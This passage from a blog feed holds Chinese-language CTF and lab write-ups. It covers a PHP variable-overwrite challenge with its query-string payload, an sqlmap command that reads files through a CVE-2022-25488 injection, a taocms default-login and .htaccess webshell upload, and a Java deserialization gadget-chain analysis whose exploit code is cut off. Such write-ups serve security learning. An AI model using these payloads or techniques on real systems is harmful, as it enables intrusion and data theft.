    <content type="html"><![CDATA[<h1 id="回归基本功"><a href="#回归基本功" class="headerlink" title="回归基本功"></a>回归基本功</h1><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>web基本知识，PHP函数绕过，变量覆盖</p><h2 id="题解过程"><a href="#题解过程" class="headerlink" title="题解过程"></a>题解过程</h2><h3 id="User-Agent猜测"><a href="#User-Agent猜测" class="headerlink" title="User-Agent猜测"></a>User-Agent猜测</h3><p><img src="/./../img/ISCC/1.png"></p><p>根据提示我们需要更改他的User-Agent属性为正确的内容，一个一个尝试直到User-Agent: GaoJiGongChengShiFoYeGe成功得到下一个地址</p><p><img src="/./../img/ISCC/2.png"></p><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;E8sP4g7UvT.php&#x27;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;huigui_jibengong.1&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;huigui_jibengong.2&#x27;</span>];<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;huigui_jibengong.3&#x27;</span>];<br><br><span class="hljs-variable">$jiben</span> = <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$a</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9]+$/&#x27;</span>,<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$jiben</span>==<span class="hljs-number">1</span>)<br>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$b</span>) == <span class="hljs-string">&#x27;jibengong&#x27;</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$b</span>, <span class="hljs-string">&quot;0&quot;</span>)==<span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;基本功不够扎实啊！&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;还得再练！&#x27;</span>;  <br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-variable">$$c</span> = <span class="hljs-variable">$a</span>;<br>            <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$b</span>,<span class="hljs-variable">$huiguiflag</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$huiguiflag</span>[<span class="hljs-variable">$jibengong</span>]==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$c</span>))<br>            &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;基本功不够扎实啊！&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;还得再练！&#x27;</span>; <br>            &#125;<br>        &#125; <br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;基本功不够扎实啊！&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;还得再练！&#x27;</span>; <br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;基本功不够扎实啊！&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;还得再练！&#x27;</span>; <br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>可以发现出题人非常丧心病狂，加了非常多障碍，我们一个一个破解</p><h3 id="Jiben"><a href="#Jiben" class="headerlink" title="Jiben"></a>Jiben</h3><p>可以看到他限制了a的值为数字与数字字符串，然后b的值只能是数字和小写字母。</p><h3 id="intval"><a href="#intval" class="headerlink" title="intval"></a>intval</h3><p>intval可以利用%0a绕过并且b中需要有一个数字0这里后面会利用到</p><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>到了题目的关键结点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$$c</span> = <span class="hljs-variable">$a</span>;<br><span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$b</span>,<span class="hljs-variable">$huiguiflag</span>);<br></code></pre></td></tr></table></figure><p><img src="/./../img/ISCC/3.png"></p><p>这里我们构造payload时就要注意了，也是题目巧妙的地方，先给出payload在分析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?huigui[jibengong.<span class="hljs-number">1</span>=<span class="hljs-number">1</span>&amp;huigui[jibengong.<span class="hljs-number">2</span>=%<span class="hljs-number">0</span>aq=q%<span class="hljs-number">261</span>=e559dcee72d03a13110efe9b6355b30d&amp;huigui[jibengong.<span class="hljs-number">3</span>=jibengong<br></code></pre></td></tr></table></figure><p>b&#x3D;%0aq&#x3D;q%261&#x3D;e559dcee72d03a13110efe9b6355b30d</p><p>这里parse_str会解析成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">array</span>(<span class="hljs-number">2</span>) &#123;<br>  [<span class="hljs-string">&quot;</span><br><span class="hljs-string">q&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;q&quot;</span><br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">32</span>) <span class="hljs-string">&quot;e559dcee72d03a13110efe9b6355b30d&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到%0a对于索引的干扰被我们赶到了其他地方，还有就是这里的索引1我们看到源代码中，</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(<span class="hljs-variable">$huiguiflag</span>[<span class="hljs-variable">$jibengong</span>]==md5(<span class="hljs-variable">$c</span>)</span></span>)<br></code></pre></td></tr></table></figure><p>$jibengong变量没有指出，所以这里用他提供的$$c&#x3D;$c进行变量覆盖构造成$jibengong&#x3D;$a</p><p>变量a只能是数字</p><p>然后就是md5比较，c的值我们设置的是jibengong，md5(“jibenong”)&#x3D;e559dcee72d03a13110efe9b6355b30d</p><p>所以把b中1对应的value改为这个就行了，最后得到flag</p><p><img src="/./../img/ISCC/4.png"></p><h3 id="机制利用"><a href="#机制利用" class="headerlink" title="机制利用"></a>机制利用</h3><p>这里传参需要注意，因为变量名存在小数点，我们需要利用一个机制</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">当PHP版本小于<span class="hljs-number">8</span>时，如果参数中出现中括号[，中括号会被转换成下划线<span class="hljs-literal">_</span>，但是会出现转换错误导致接下来如果该参数名中还有非法字符并不会继续转换成下划线<span class="hljs-literal">_</span>，也就是说如果中括号[出现在前面，那么中括号[还是会被转换成下划线<span class="hljs-literal">_</span>，但是因为出错导致接下来的非法字符并不会被转换成下划线<span class="hljs-literal">_</span><br></code></pre></td></tr></table></figure><p>所以这里传参时需要把参数名改为<strong>huigui[jibengong.1</strong>不然点号会被改为下划线，无法正确传参</p><p>nezha&#x3D;{“incantation”:”I_am_the_spiI_am_the_spirit_of_firerit_of_fire”,”md5”:”QNKCDZO”,”power”:”s878926199a”}&amp;ming&#x3D;suoom&amp;li&#x3D;woolihc</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>春秋云镜Day2</title>
    <link href="/2025/04/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CDay2/"/>
    <url>/2025/04/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CDay2/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2022-25488"><a href="#CVE-2022-25488" class="headerlink" title="CVE-2022-25488"></a>CVE-2022-25488</h1><h2 id="靶标介绍："><a href="#靶标介绍：" class="headerlink" title="靶标介绍："></a><em>靶标介绍：</em></h2><p>Atom CMS v2.0存在sql注入漏洞在&#x2F;admin&#x2F;ajax&#x2F;avatar.php页面</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p><img src="/./../img/ChunQiu/CVE-2022-25488/1.png"></p><p>打开网页发现一片空白，尝试读取ajax目录</p><p><img src="/./../img/ChunQiu/CVE-2022-25488/2.png"></p><p>发现存在的许多php文件</p><p><img src="/./../img/ChunQiu/CVE-2022-25488/3.png"></p><p>点进去发现是一个sql语句错误，根据id属性去检索数据，我们传入参数id到sqlmap扫描</p><p><img src="/./../img/ChunQiu/CVE-2022-25488/4.png"></p><p>扫描成功，id属性存在sql注入漏洞，直接sqlmap梭哈结束</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python sqlmap.py -u http://xxx.ichunqiu.com/admin/ajax/avatar.php?id=1 --batch --file-read &quot;/flag&quot; --dbms mysql<br></code></pre></td></tr></table></figure><p><img src="/./../img/ChunQiu/CVE-2022-25488/5.png"></p><h1 id="CVE-2022-25578"><a href="#CVE-2022-25578" class="headerlink" title="CVE-2022-25578"></a>CVE-2022-25578</h1><h2 id="靶标介绍：-1"><a href="#靶标介绍：-1" class="headerlink" title="靶标介绍："></a><em>靶标介绍：</em></h2><p>taocms v3.0.2允许攻击者通过编辑.htaccess文件执行任意代码</p><h2 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h2><ul><li><strong>避免编辑服务器配置文件</strong>：除非必要，否则不要编辑 <code>.htaccess</code> 等服务器配置文件。</li><li><strong>使用供应商提供的配置文件</strong>：确保使用经过验证的供应商配置文件，并定期更新以防止已知漏洞的利用。</li><li><strong>定期安全扫描</strong>：使用安全扫描工具检测和修复漏洞，以确保服务器的安全性。</li></ul><h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><p><img src="/./../img/ChunQiu/CVE-2022-25578/1.png"></p><p>进来是一个taoCMS的网页，看到网页传了id等参数，猜测可能有sql注入，但是可能靶机没有开发，所以测试不出来</p><p><img src="/./../img/ChunQiu/CVE-2022-25578/2.png"></p><p>根据提示该漏洞是文件上传漏洞，我们需要找到文件上传的点，但是这个页面并没有可以上传文件的地方，注意到下方的管理</p><p><img src="/./../img/ChunQiu/CVE-2022-25578/3.png"></p><p>跳转到了管理后台的登录页面，根据网上搜索的taocms初始密码admin&#x2F;tao，进入了后台</p><p><img src="/./../img/ChunQiu/CVE-2022-25578/4.png"></p><h3 id="sql执行解题"><a href="#sql执行解题" class="headerlink" title="sql执行解题"></a>sql执行解题</h3><p><img src="/./../img/ChunQiu/CVE-2022-25578/5.png"></p><p>后台有专门的sql语句执行，按照春秋云镜的flag位置，我们可以尝试直接读取flag</p><p><img src="/./../img/ChunQiu/CVE-2022-25578/6.png"></p><p>直接读取到了flag</p><h3 id="文件上传解题"><a href="#文件上传解题" class="headerlink" title="文件上传解题"></a>文件上传解题</h3><p><img src="/./../img/ChunQiu/CVE-2022-25578/7.png"></p><p>来到文件管理页面，我们注意到了.htaccess文件，我们先尝试能否直接上传php文件（文件管理页面的上传无法使用，我们需要移步添加文章位置）</p><p><img src="/./../img/ChunQiu/CVE-2022-25578/8.png"></p><p>发现他进行了白名单过滤</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">txt,rar,zip,jpg,jpeg,gif,png,swf,wmv,avi,wma,mp3,<span class="hljs-built_in">mid</span>,jar,jad,exe,html,htm,css,js,doc<br></code></pre></td></tr></table></figure><p>我们可以修改.htaccess文件将任意后缀名解析成php文件</p><p><img src="/./../img/ChunQiu/CVE-2022-25578/9.png"></p><p>然后我们在修改木马的后缀名为png即可</p><p><img src="/./../img/ChunQiu/CVE-2022-25578/10.png"></p><p>冰蝎马上传成功，直接根据路径访问他</p><p><img src="/./../img/ChunQiu/CVE-2022-25578/11.png"></p><p>连接成功</p><p><img src="/./../img/ChunQiu/CVE-2022-25578/12.png"></p>]]></content>
    
    
    <categories>
      
      <category>春秋云镜</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>EventListenerList触发任意toString</title>
    <link href="/2025/04/19/EventListenerList%E8%A7%A6%E5%8F%91%E4%BB%BB%E6%84%8FtoString/"/>
    <url>/2025/04/19/EventListenerList%E8%A7%A6%E5%8F%91%E4%BB%BB%E6%84%8FtoString/</url>
    
    <content type="html"><![CDATA[<h2 id="EventListenerList触发任意toString"><a href="#EventListenerList触发任意toString" class="headerlink" title="EventListenerList触发任意toString"></a>EventListenerList触发任意toString</h2><p>之前提到fastjson原生反序列化的时候，那一条链子是通过触发<code>jsonArray</code>的<code>toString</code>方法开始的，这里讲一条新的链子（之前使用的是最经典的<code>BadAttributeValueExpException</code>作为toString的入口）</p><h3 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h3><h4 id="javax-swing-event-EventListenerList-readObject"><a href="#javax-swing-event-EventListenerList-readObject" class="headerlink" title="javax.swing.event.EventListenerList#readObject"></a>javax.swing.event.EventListenerList#readObject</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        listenerList = NULL_ARRAY;<br>        s.defaultReadObject();<br>        Object listenerTypeOrNull;<br><br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">null</span> != (listenerTypeOrNull = s.readObject())) &#123;<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">cl</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>            <span class="hljs-type">EventListener</span> <span class="hljs-variable">l</span> <span class="hljs-operator">=</span> (EventListener)s.readObject();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> (String) listenerTypeOrNull;<br>            ReflectUtil.checkPackageAccess(name);<br>            add((Class&lt;EventListener&gt;)Class.forName(name, <span class="hljs-literal">true</span>, cl), l);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>其中的s这里会有一个强转要求是<code>EventListener</code>接口。</p><p>我们先看看他是否可控，在EventListener的writeObject中s是可控的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(ObjectOutputStream s)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Object[] lList = listenerList;<br>        s.defaultWriteObject();<br><br>        <span class="hljs-comment">// Save the non-null event listeners:</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; lList.length; i+=<span class="hljs-number">2</span>) &#123;<br>            Class&lt;?&gt; t = (Class)lList[i];<br>            <span class="hljs-type">EventListener</span> <span class="hljs-variable">l</span> <span class="hljs-operator">=</span> (EventListener)lList[i+<span class="hljs-number">1</span>];<br>            <span class="hljs-keyword">if</span> ((l!=<span class="hljs-literal">null</span>) &amp;&amp; (l <span class="hljs-keyword">instanceof</span> Serializable)) &#123;<br>                s.writeObject(t.getName());<br>                s.writeObject(l);<br>            &#125;<br>        &#125;<br><br>        s.writeObject(<span class="hljs-literal">null</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>这里使用UndoManager类，它实现了<code>UndoableEditListener</code>接口，<code>UndoableEditListener</code>接口继承了<code>EventListener</code>类，<code>UndoManager</code>类也继承了<code>CompoundEdit</code>类，向上继承了<code>AbstractUndoableEdit</code>类，这个类继承了<code>Serializable</code>接口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> &lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">EventListener</span>&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(Class&lt;T&gt; t, T l)</span> &#123;<br>        <span class="hljs-keyword">if</span> (l==<span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">// In an ideal world, we would do an assertion here</span><br>            <span class="hljs-comment">// to help developers know they are probably doing</span><br>            <span class="hljs-comment">// something wrong</span><br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!t.isInstance(l)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Listener &quot;</span> + l +<br>                                         <span class="hljs-string">&quot; is not of type &quot;</span> + t);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (listenerList == NULL_ARRAY) &#123;<br>            <span class="hljs-comment">// if this is the first listener added,</span><br>            <span class="hljs-comment">// initialize the lists</span><br>            listenerList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; t, l &#125;;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// Otherwise copy the array and add the new listener</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> listenerList.length;<br>            Object[] tmp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[i+<span class="hljs-number">2</span>];<br>            System.arraycopy(listenerList, <span class="hljs-number">0</span>, tmp, <span class="hljs-number">0</span>, i);<br><br>            tmp[i] = t;<br>            tmp[i+<span class="hljs-number">1</span>] = l;<br><br>            listenerList = tmp;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (!t.isInstance(l)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Listener &quot;</span> + l +<br>                                         <span class="hljs-string">&quot; is not of type &quot;</span> + t);<br>        &#125;<br></code></pre></td></tr></table></figure><p>然后会调用<code>add</code>方法，这里跟到add方法中看看。这里使用的是拼接方法，就是这里会有一个隐式转换调用<code>toString</code></p><h4 id="javax-swing-undo-UndoManager-toString"><a href="#javax-swing-undo-UndoManager-toString" class="headerlink" title="javax.swing.undo.UndoManager#toString"></a>javax.swing.undo.UndoManager#toString</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.toString() + <span class="hljs-string">&quot; limit: &quot;</span> + limit +<br>            <span class="hljs-string">&quot; indexOfNextAdd: &quot;</span> + indexOfNextAdd;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这里两个值都是<code>int</code>，我们直接看<code>super.toString</code>，他父类的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.toString()<br>            + <span class="hljs-string">&quot; inProgress: &quot;</span> + inProgress<br>            + <span class="hljs-string">&quot; edits: &quot;</span> + edits;<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="java-util-Vector-toString"><a href="#java-util-Vector-toString" class="headerlink" title="java.util.Vector#toString"></a>java.util.Vector#toString</h4><p>这里存在两个值，我们看到<code>edits</code>是<code>Vector</code>类，这里同样会隐式转换调用<code>Vector</code>类的<code>toString</code>方法，我们跟进看看</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Vector&lt;UndoableEdit&gt; edits;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.toString();<br>    &#125;<br></code></pre></td></tr></table></figure><p>继续调用了父类的<code>toString</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        Iterator&lt;E&gt; it = iterator();<br>        <span class="hljs-keyword">if</span> (! it.hasNext())<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[]&quot;</span>;<br><br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        sb.append(<span class="hljs-string">&#x27;[&#x27;</span>);<br>        <span class="hljs-keyword">for</span> (;;) &#123;<br>            <span class="hljs-type">E</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> it.next();<br>            sb.append(e == <span class="hljs-built_in">this</span> ? <span class="hljs-string">&quot;(this Collection)&quot;</span> : e);<br>            <span class="hljs-keyword">if</span> (! it.hasNext())<br>                <span class="hljs-keyword">return</span> sb.append(<span class="hljs-string">&#x27;]&#x27;</span>).toString();<br>            sb.append(<span class="hljs-string">&#x27;,&#x27;</span>).append(<span class="hljs-string">&#x27; &#x27;</span>);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>然后使用了<code>StringBuilder</code>的<code>append</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> StringBuilder <span class="hljs-title function_">append</span><span class="hljs-params">(Object obj)</span> &#123;<br>        <span class="hljs-keyword">return</span> append(String.valueOf(obj));<br>    &#125;<br></code></pre></td></tr></table></figure><p>继续跟进<code>valueOf</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">valueOf</span><span class="hljs-params">(Object obj)</span> &#123;<br>    <span class="hljs-keyword">return</span> (obj == <span class="hljs-literal">null</span>) ? <span class="hljs-string">&quot;null&quot;</span> : obj.toString();<br>&#125;<br></code></pre></td></tr></table></figure><p>到这里，就完成了任意<code>toString</code>方法调用了。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> 